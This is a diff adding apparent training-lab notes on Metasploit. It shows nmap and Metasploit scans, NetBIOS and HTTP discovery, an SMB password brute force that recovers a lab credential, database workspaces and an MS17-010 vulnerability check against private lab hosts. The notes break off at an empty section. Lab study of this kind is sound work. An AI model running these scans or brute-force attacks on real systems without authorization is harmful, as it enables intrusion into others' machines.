@@ -448,8 +448,439 @@ Priv: Timestomp Commands
 
 
 
+## METASPLOIT: EXPLOITATION 
+
+The topics we will cover are:
+- How to scan target systems using Metasploit.
+- How to use the Metasploit database feature.
+- How to use Metasploit to conduct a vulnerability scan.
+- How to use Metasploit to exploit vulnerable services on target systems.
+- How msfvenom can be used to create payloads and obtain a Meterpreter session on the target system.
+
+use this wordlist in this challenge `/usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt`
 
 
+### SCANNING 
+SCAN FIRST
+```
+[*] exec: sudo nmap -sS -sV -T4 --min-rate 8888 10.10.214.253
+
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2022-11-21 12:40 GMT
+Nmap scan report for ip-10-10-214-253.eu-west-1.compute.internal (10.10.214.253)
+Host is up (0.00094s latency).
+Not shown: 995 closed ports
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         ProFTPD 1.3.5e
+22/tcp   open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: ACME IT SUPPORT)
+445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: ACME IT SUPPORT)
+8000/tcp open  http        WebFS httpd 1.21
+MAC Address: 02:33:79:1D:B6:3D (Unknown)
+Service Info: Host: IP-10-10-214-253; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 12.08 seconds
+
+```
+
+Now we open up `msfconsole` to test port scanning 
+```
+msf5 > search portscan
+
+Matching Modules
+================
+
+   #  Name                                              Disclosure Date  Rank    Check  Description
+   -  ----                                              ---------------  ----    -----  -----------
+   0  auxiliary/scanner/http/wordpress_pingback_access                   normal  No     Wordpress Pingback Locator
+   1  auxiliary/scanner/natpmp/natpmp_portscan                           normal  No     NAT-PMP External Port Scanner
+   2  auxiliary/scanner/portscan/ack                                     normal  No     TCP ACK Firewall Scanner
+   3  auxiliary/scanner/portscan/ftpbounce                               normal  No     FTP Bounce Port Scanner
+   4  auxiliary/scanner/portscan/syn                                     normal  No     TCP SYN Port Scanner
+   5  auxiliary/scanner/portscan/tcp                                     normal  No     TCP Port Scanner
+   6  auxiliary/scanner/portscan/xmas                                    normal  No     TCP "XMas" Port Scanner
+   7  auxiliary/scanner/sap/sap_router_portscanner                       normal  No     SAPRouter Port Scanner
+
+
+Interact with a module by name or index, for example use 7 or use auxiliary/scanner/sap/sap_router_portscanner
+
+msf5 > use 5
+msf5 auxiliary(scanner/portscan/tcp) > show options
+
+Module options (auxiliary/scanner/portscan/tcp):
+
+   Name         Current Setting  Required  Description
+   ----         ---------------  --------  -----------
+   CONCURRENCY  10               yes       The number of concurrent ports to check per host
+   DELAY        0                yes       The delay between connections, per thread, in milliseconds
+   JITTER       0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.
+   PORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)
+   RHOSTS                        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   THREADS      1                yes       The number of concurrent threads (max one per host)
+   TIMEOUT      1000             yes       The socket connect timeout in milliseconds
+
+msf5 auxiliary(scanner/portscan/tcp) > setg RHOSTS 10.10.214.253
+RHOSTS => 10.10.214.253
+msf5 auxiliary(scanner/portscan/tcp) > run
+
+[+] 10.10.214.253:        - 10.10.214.253:22 - TCP OPEN
+[+] 10.10.214.253:        - 10.10.214.253:21 - TCP OPEN
+[+] 10.10.214.253:        - 10.10.214.253:139 - TCP OPEN
+[+] 10.10.214.253:        - 10.10.214.253:445 - TCP OPEN
+[+] 10.10.214.253:        - 10.10.214.253:8000 - TCP OPEN
+[*] 10.10.214.253:        - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+```
+Ofcourse nmap is still better than this, but we still want to explore what metasploit scanning can do
+
+Next is Discovering `NETBIOS`
+```
+msf5 auxiliary(scanner/portscan/tcp) > search nbname
+
+Matching Modules
+================
+
+   #  Name                              Disclosure Date  Rank    Check  Description
+   -  ----                              ---------------  ----    -----  -----------
+   0  auxiliary/scanner/netbios/nbname                   normal  No     NetBIOS Information Discovery
+
+
+msf5 auxiliary(scanner/portscan/tcp) > use 0
+msf5 auxiliary(scanner/netbios/nbname) > show options
+
+Module options (auxiliary/scanner/netbios/nbname):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   BATCHSIZE  256              yes       The number of hosts to probe in each set
+   RHOSTS     10.10.214.253    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT      137              yes       The target port (UDP)
+   THREADS    10               yes       The number of concurrent threads
+
+msf5 auxiliary(scanner/netbios/nbname) > run
+
+[*] Sending NetBIOS requests to 10.10.214.253->10.10.214.253 (1 hosts)
+[+] 10.10.214.253 [IP-10-10-214-25] OS:Unix Names:(ACME IT SUPPORT, IP-10-10-214-25) Addresses:(10.10.214.253) Mac:00:00:00:00:00:00 
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+```
+We have discover they are runnint ACME IT SUPPORT. 
+
+
+Next Let's try the `http_version` module  
+```
+msf5 auxiliary(scanner/netbios/nbname) > search http_version
+
+Matching Modules
+================
+
+   #  Name                                 Disclosure Date  Rank    Check  Description
+   -  ----                                 ---------------  ----    -----  -----------
+   0  auxiliary/scanner/http/http_version                   normal  No     HTTP Version Detection
+
+
+msf5 auxiliary(scanner/netbios/nbname) > use 0
+msf5 auxiliary(scanner/http/http_version) > show options
+
+Module options (auxiliary/scanner/http/http_version):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS   10.10.214.253    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT    80               yes       The target port (TCP)
+   SSL      false            no        Negotiate SSL/TLS for outgoing connections
+   THREADS  1                yes       The number of concurrent threads (max one per host)
+   VHOST                     no        HTTP server virtual host
+
+msf5 auxiliary(scanner/http/http_version) > set RPORT 8000
+RPORT => 8000
+msf5 auxiliary(scanner/http/http_version) > run
+
+[+] 10.10.214.253:8000 webfs/1.21 ( 403-Forbidden )
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+```
+Now we have Discovered they are using `webfs/1.21`
+
+Next we'll try to brute force `smb_login` using a wordlist
+```
+msf5 auxiliary(scanner/http/http_version) > search smb_login
+
+Matching Modules
+================
+
+   #  Name                             Disclosure Date  Rank    Check  Description
+   -  ----                             ---------------  ----    -----  -----------
+   0  auxiliary/scanner/smb/smb_login                   normal  No     SMB Login Check Scanner
+
+
+msf5 auxiliary(scanner/http/http_version) > use 0
+msf5 auxiliary(scanner/smb/smb_login) > show options
+
+Module options (auxiliary/scanner/smb/smb_login):
+
+   Name               Current Setting  Required  Description
+   ----               ---------------  --------  -----------
+   ABORT_ON_LOCKOUT   false            yes       Abort the run when an account lockout is detected
+   BLANK_PASSWORDS    false            no        Try blank passwords for all users
+   BRUTEFORCE_SPEED   5                yes       How fast to bruteforce, from 0 to 5
+   DB_ALL_CREDS       false            no        Try each user/password couple stored in the current database
+   DB_ALL_PASS        false            no        Add all passwords in the current database to the list
+   DB_ALL_USERS       false            no        Add all users in the current database to the list
+   DETECT_ANY_AUTH    false            no        Enable detection of systems accepting any authentication
+   DETECT_ANY_DOMAIN  false            no        Detect if domain is required for the specified user
+   PASS_FILE                           no        File containing passwords, one per line
+   PRESERVE_DOMAINS   true             no        Respect a username that contains a domain name.
+   Proxies                             no        A proxy chain of format type:host:port[,type:host:port][...]
+   RECORD_GUEST       false            no        Record guest-privileged random logins to the database
+   RHOSTS             10.10.214.253    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT              445              yes       The SMB service port (TCP)
+   SMBDomain          .                no        The Windows domain to use for authentication
+   SMBPass                             no        The password for the specified username
+   SMBUser                             no        The username to authenticate as
+   STOP_ON_SUCCESS    false            yes       Stop guessing when a credential works for a host
+   THREADS            1                yes       The number of concurrent threads (max one per host)
+   USERPASS_FILE                       no        File containing users and passwords separated by space, one pair per line
+   USER_AS_PASS       false            no        Try the username as the password for all users
+   USER_FILE                           no        File containing usernames, one per line
+   VERBOSE            true             yes       Whether to print output for all attempts
+
+msf5 auxiliary(scanner/smb/smb_login) > set PASS_FILE /usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt
+PASS_FILE => /usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt
+msf5 auxiliary(scanner/smb/smb_login) > run
+
+[*] 10.10.214.253:445     - 10.10.214.253:445 - Starting SMB login bruteforce
+[-] 10.10.214.253:445     - 10.10.214.253:445 - Failed: '.\penny:95',
+[-] 10.10.214.253:445     - 10.10.214.253:445 - Failed: '.\penny:98',
+[-] 10.10.214.253:445     - 10.10.214.253:445 - Failed: '.\penny:2003',
+[-] 10.10.214.253:445     - 10.10.214.253:445 - Failed: '.\penny:2008',
+[-] 10.10.214.253:445     - 10.10.214.253:445 - Failed: '.\penny:111111',
+[-] 10.10.214.253:445     - 10.10.214.253:445 - Failed: '.\penny:123456',
+[-] 10.10.214.253:445     - 10.10.214.253:445 - Failed: '.\penny:12345678',
+[-] 10.10.214.253:445     - 10.10.214.253:445 - Failed: '.\penny:1qaz2wsx',
+[-] 10.10.214.253:445     - 10.10.214.253:445 - Failed: '.\penny:abc',
+[-] 10.10.214.253:445     - 10.10.214.253:445 - Failed: '.\penny:abc123',
+[-] 10.10.214.253:445     - 10.10.214.253:445 - Failed: '.\penny:abcd123',
+[-] 10.10.214.253:445     - 10.10.214.253:445 - Failed: '.\penny:account',
+[-] 10.10.214.253:445     - 10.10.214.253:445 - Failed: '.\penny:admin',
+[-] 10.10.214.253:445     - 10.10.214.253:445 - Failed: '.\penny:adminadmin',
+[-] 10.10.214.253:445     - 10.10.214.253:445 - Failed: '.\penny:administator',
+[-] 10.10.214.253:445     - 10.10.214.253:445 - Failed: '.\penny:admins',
+[-] 10.10.214.253:445     - 10.10.214.253:445 - Failed: '.\penny:air',
+[-] 10.10.214.253:445     - 10.10.214.253:445 - Failed: '.\penny:alpine',
+[-] 10.10.214.253:445     - 10.10.214.253:445 - Failed: '.\penny:Autumn2013',
+[-] 10.10.214.253:445     - 10.10.214.253:445 - Failed: '.\penny:autumn2013',
+[-] 10.10.214.253:445     - 10.10.214.253:445 - Failed: '.\penny:Autumn2014',
+[-] 10.10.214.253:445     - 10.10.214.253:445 - Failed: '.\penny:autumn2014',
+[-] 10.10.214.253:445     - 10.10.214.253:445 - Failed: '.\penny:Autumn2015',
+[-] 10.10.214.253:445     - 10.10.214.253:445 - Failed: '.\penny:autumn2015',
+[-] 10.10.214.253:445     - 10.10.214.253:445 - Failed: '.\penny:Autumn2016',
+[-] 10.10.214.253:445     - 10.10.214.253:445 - Failed: '.\penny:autumn2016',
+[-] 10.10.214.253:445     - 10.10.214.253:445 - Failed: '.\penny:Autumn2017',
+[-] 10.10.214.253:445     - 10.10.214.253:445 - Failed: '.\penny:autumn2017',
+[-] 10.10.214.253:445     - 10.10.214.253:445 - Failed: '.\penny:bankbank',
+[-] 10.10.214.253:445     - 10.10.214.253:445 - Failed: '.\penny:baseball',
+[-] 10.10.214.253:445     - 10.10.214.253:445 - Failed: '.\penny:basketball',
+[-] 10.10.214.253:445     - 10.10.214.253:445 - Failed: '.\penny:bird',
+[-] 10.10.214.253:445     - 10.10.214.253:445 - Failed: '.\penny:burp',
+[-] 10.10.214.253:445     - 10.10.214.253:445 - Failed: '.\penny:change',
+[-] 10.10.214.253:445     - 10.10.214.253:445 - Failed: '.\penny:changelater',
+[-] 10.10.214.253:445     - 10.10.214.253:445 - Failed: '.\penny:changeme',
+[-] 10.10.214.253:445     - 10.10.214.253:445 - Failed: '.\penny:company',
+[-] 10.10.214.253:445     - 10.10.214.253:445 - Failed: '.\penny:company!',
+[-] 10.10.214.253:445     - 10.10.214.253:445 - Failed: '.\penny:company1',
+[-] 10.10.214.253:445     - 10.10.214.253:445 - Failed: '.\penny:company1!',
+[-] 10.10.214.253:445     - 10.10.214.253:445 - Failed: '.\penny:company123',
+[-] 10.10.214.253:445     - 10.10.214.253:445 - Failed: '.\penny:complex',
+[-] 10.10.214.253:445     - 10.10.214.253:445 - Failed: '.\penny:complex1',
+[-] 10.10.214.253:445     - 10.10.214.253:445 - Failed: '.\penny:complex2',
+[-] 10.10.214.253:445     - 10.10.214.253:445 - Failed: '.\penny:complex3',
+[-] 10.10.214.253:445     - 10.10.214.253:445 - Failed: '.\penny:complexpassword',
+[-] 10.10.214.253:445     - 10.10.214.253:445 - Failed: '.\penny:database',
+[-] 10.10.214.253:445     - 10.10.214.253:445 - Failed: '.\penny:default',
+[-] 10.10.214.253:445     - 10.10.214.253:445 - Failed: '.\penny:dev',
+[-] 10.10.214.253:445     - 10.10.214.253:445 - Failed: '.\penny:devdev',
+[-] 10.10.214.253:445     - 10.10.214.253:445 - Failed: '.\penny:devdevdev',
+[-] 10.10.214.253:445     - 10.10.214.253:445 - Failed: '.\penny:dirt',
+[-] 10.10.214.253:445     - 10.10.214.253:445 - Failed: '.\penny:dragon',
+[-] 10.10.214.253:445     - 10.10.214.253:445 - Failed: '.\penny:earth',
+[-] 10.10.214.253:445     - 10.10.214.253:445 - Failed: '.\penny:fire',
+[-] 10.10.214.253:445     - 10.10.214.253:445 - Failed: '.\penny:football',
+[-] 10.10.214.253:445     - 10.10.214.253:445 - Failed: '.\penny:goat',
+[-] 10.10.214.253:445     - 10.10.214.253:445 - Failed: '.\penny:goat',
+[-] 10.10.214.253:445     - 10.10.214.253:445 - Failed: '.\penny:god',
+[-] 10.10.214.253:445     - 10.10.214.253:445 - Failed: '.\penny:guessme',
+[-] 10.10.214.253:445     - 10.10.214.253:445 - Failed: '.\penny:hugs',
+[-] 10.10.214.253:445     - 10.10.214.253:445 - Failed: '.\penny:letmein',
+[+] 10.10.214.253:445     - 10.10.214.253:445 - Success: '.\penny:leo1234'
+[*] 10.10.214.253:445     - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+```
+
+   
+
+### METASPLOIT DATABASE 
+
+Metasploit has a database function to simplify project management and avoid possible confusion when setting up parameter values.
+
+```
+root@kali:~# systemctl start postgresql
+root@kali:~# msfdb init
+[i] Database already started
+[+] Creating database user 'msf'
+[+] Creating databases 'msf'
+[+] Creating databases 'msf_test'
+[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'
+[+] Creating initial database schema
+/usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/activerecord-4.2.11.3/lib/active_record/connection_adapters/abstract_adapter.rb:84: warning: deprecated Object#=~ is called on Integer; it always returns nil
+
+```
+You can now launch msfconsole and check the database status using the db_status command.
+
+```
+msf6 > db_status
+[*] Connected to msf. Connection type: postgresql.
+msf6 >
+```
+The database feature will allow you to create workspaces to isolate different projects. When first launched, you should be in the default workspace. You can list available workspaces using the workspace command. The database feature will allow you to create workspaces to isolate different projects. When first launched, you should be in the default workspace. You can list available workspaces using the `workspace` command. 
+```
+msf6 > workspace
+* default
+msf6 >
+
+msf6 > workspace
+* default
+msf6 >
+msf6 > workspace -a tryhackme
+[*] Added workspace: tryhackme
+[*] Workspace: tryhackme
+msf6 > workspace -h
+Usage:
+    workspace          List workspaces
+    workspace [name]   Switch workspace
+
+OPTIONS:
+
+    -a, --add <name>          Add a workspace.
+    -d, --delete <name>       Delete a workspace.
+    -D, --delete-all          Delete all workspaces.
+    -h, --help                Help banner.
+    -l, --list                List workspaces.
+    -r, --rename <old> <new>  Rename a workspace.
+    -S, --search <name>       Search for a workspace.
+    -v, --list-verbose        List workspaces verbosely.
+
+
+```
+
+If you run a Nmap scan using the db_nmap shown below, all results will be saved to the database. 
+```
+msf6 > db_nmap -sV -T4 --min-rate 8888 10.10.214.253 -vv
+[*] Nmap: Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-21 13:24 UTC
+[*] Nmap: NSE: Loaded 45 scripts for scanning.
+...
+
+# YOU CAN NOW USE `HOSTS` and `SERVICES`
+msf6 > hosts                                                                                                   
+                                                                                                               
+Hosts                                                                                                          
+=====                                                                                                          
+                                                                                                               
+address        mac                name                     os_name  os_flavor  os_sp  purpose  info  comments  
+-------        ---                ----                     -------  ---------  -----  -------  ----  --------  
+10.10.214.253  02:33:79:1d:b6:3d  ip-10-10-214-253.eu-wes  Unknown                    device                   
+                                  t-1.compute.internal                                                         
+                                                                                                               
+msf6 > services                                                                                                
+Services                                                                                                       
+========                                                                                                       
+                                                                                                               
+host           port  proto  name         state  info                                                           
+----           ----  -----  ----         -----  ----                                                           
+10.10.214.253  21    tcp    ftp          open   ProFTPD 1.3.5e                                                 
+10.10.214.253  22    tcp    ssh          open   OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 Ubuntu Linux; protocol 2.0     
+10.10.214.253  139   tcp    netbios-ssn  open   Samba smbd 3.X - 4.X workgroup: ACME IT SUPPORT                
+10.10.214.253  445   tcp    netbios-ssn  open   Samba smbd 3.X - 4.X workgroup: ACME IT SUPPORT                
+10.10.214.253  8000  tcp    http         open   WebFS httpd 1.21         
+```
+
+**Example Workflow**
+
+- We will use the vulnerability scanning module that finds potential MS17-010 vulnerabilities with the use auxiliary/scanner/smb/smb_ms17_010 command.
+- We set the RHOSTS value using hosts -R.
+- We have typed show options to check if all values were assigned correctly. (In this example, 10.10.138.32 is the IP address we have scanned earlier using the db_nmap command)
+- Once all parameters are set, we launch the exploit using the run or exploit command. 
+
+```
+msf6 > use auxiliary/scanner/smb/smb_ms17_010
+msf5 auxiliary(scanner/smb/smb_ms17_010) > hosts -R
+
+Hosts
+=====
+
+address       mac                name                                        os_name  os_flavor  os_sp  purpose  info  comments
+-------       ---                ----                                        -------  ---------  -----  -------  ----  --------
+10.10.12.229  02:ce:59:27:c8:e3  ip-10-10-12-229.eu-west-1.compute.internal  Unknown                    device
+
+RHOSTS => 10.10.12.229
+
+msf6 auxiliary(scanner/smb/smb_ms17_010) > show options
+
+Module options (auxiliary/scanner/smb/smb_ms17_010):
+
+Name         Current Setting                                                 Required  Description
+----         ---------------                                                 --------  -----------
+CHECK_ARCH   true                                                            no        Check for architecture on vulnerable hosts
+CHECK_DOPU   true                                                            no        Check for DOUBLEPULSAR on vulnerable hosts
+CHECK_PIPE   false                                                           no        Check for named pipe on vulnerable hosts
+NAMED_PIPES  /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
+RHOSTS       10.10.12.229                                                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:'
+RPORT        445                                                             yes       The SMB service port (TCP)
+SMBDomain    .                                                               no        The Windows domain to use for authentication
+SMBPass                                                                      no        The password for the specified username
+SMBUser                                                                      no        The username to authenticate as
+THREADS      1                                                               yes       The number of concurrent threads (max one per host)
+
+msf6 auxiliary(scanner/smb/smb_ms17_010) > run
+```
+
+If there is more than one host saved to the database, all IP addresses will be used when the hosts -R command is used.
+In a typical penetration testing engagement, we could have the following scenario:
+
+Finding available hosts using the db_nmap command
+Scanning these for further vulnerabilities or open ports (using a port scanning module)
+
+The services command used with the -S parameter will allow you to search for specific services in the environment.
+
+```
+msf6 > services -S netbios
+Services
+========
+
+host          port  proto  name         state  info
+----          ----  -----  ----         -----  ----
+10.10.12.229  139   tcp    netbios-ssn  open   Microsoft Windows netbios-ssn
+
+msf6 >
+```
+
+You may want to look for low-hanging fruits such as:
+- HTTP: Could potentially host a web application where you can find vulnerabilities like SQL injection or Remote Code Execution (RCE). 
+- FTP: Could allow anonymous login and provide access to interesting files. 
+- SMB: Could be vulnerable to SMB exploits like MS17-010
+- SSH: Could have default or easy to guess credentials
+- RDP: Could be vulnerable to Bluekeep or allow desktop access if weak credentials were used. 
+
+### VULNERABILITY SCANNING 
+
+> return to this section for notes 
+
+
+### 
 
 
 
